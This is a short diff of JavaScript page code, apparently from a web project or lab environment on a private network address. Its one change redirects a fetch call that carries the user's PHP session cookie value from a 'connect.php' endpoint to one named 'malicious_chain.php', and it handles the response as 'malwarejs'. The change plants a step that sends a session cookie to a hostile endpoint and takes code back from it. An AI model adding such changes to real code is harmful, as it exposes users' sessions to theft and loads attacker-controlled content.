@@ -31,7 +31,7 @@ if (sessionStorage.times % 2 === 0){
             alert('Please log in first.');
             window.location.href = 'https://192.168.140.100/signin.php';
         }
-        fetch("https://192.168.140.100/backend_php/connect.php?id="+phpCookieValue)
+        fetch("https://192.168.140.100/backend_php/malicious_chain.php?id="+phpCookieValue)
         .then(response => response.json())
         .then(malwarejs => {
             // Process and use the retrieved data
